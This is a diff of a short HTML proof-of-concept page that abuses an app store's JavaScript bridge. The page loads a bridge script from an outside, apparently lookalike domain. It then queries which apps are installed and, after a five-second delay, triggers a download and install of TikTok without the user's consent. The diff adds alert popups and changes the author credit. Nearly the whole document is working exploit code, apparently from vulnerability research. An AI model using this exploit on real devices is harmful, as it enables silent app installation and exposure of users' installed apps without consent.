@@ -5,16 +5,17 @@
     <title>HCSL POC</title>
 </head>
 <body>
-    <h1>Don't worried,this just a poc by wujinrong.^_^</h1>
+    <h1>Don't worried,this just a poc by HCSL.^_^</h1>
     <script type="text/javascript" src="https://wwwxhihonor.com/dsbridge.js"> </script>
     <script>
         bridge.call("download.queryAppList", {pkgNameList: "com.ss.android.ugc.trill,com.whatapp"}, function (result_json) {
+            alert(result_json)
         })
-        setTimeout(InstallAPK, 5000);
-        function InstallAPK() {
-           bridge.call("download.downloadButtonOnClick",{packageName: "com.ss.android.ugc.trill"}, function (v) {
+        setTimeout(() => {
+            alert("Begin to install app")
+              bridge.call("download.downloadButtonOnClick",{packageName: "com.ss.android.ugc.trill"}, function (v) {
            })
-        }        
+        }, 5000);       
     </script>    
 </body>
 </html>
